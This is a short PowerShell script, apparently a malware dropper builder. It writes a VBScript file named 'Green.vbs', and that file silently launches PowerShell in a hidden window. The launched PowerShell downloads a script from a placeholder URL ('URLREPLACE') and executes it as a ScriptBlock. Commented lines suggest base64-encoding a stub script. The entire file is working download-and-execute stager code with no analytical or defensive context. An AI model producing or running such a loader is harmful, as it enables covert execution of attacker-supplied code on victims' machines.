
#$text = [IO.File]::ReadAllText("stubps1tovbs.ps1")
#$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
#$encoded = [Convert]::ToBase64String($bytes)
$stub = @'
CreateObject("WScript.Shell").Run "powershell -noexit  Add-Type -AssemblyName 'System.Net.Http';$content = (New-Object System.Net.Http.HttpClient).GetAsync('URLREPLACE').Result.Content.ReadAsStringAsync().Result;$scriptBlock=[ScriptBlock]::Create($content);$scriptBlock.Invoke()", 0, False
'@
New-Item  -Name "Green.vbs" -ItemType "file" -Value "$stub"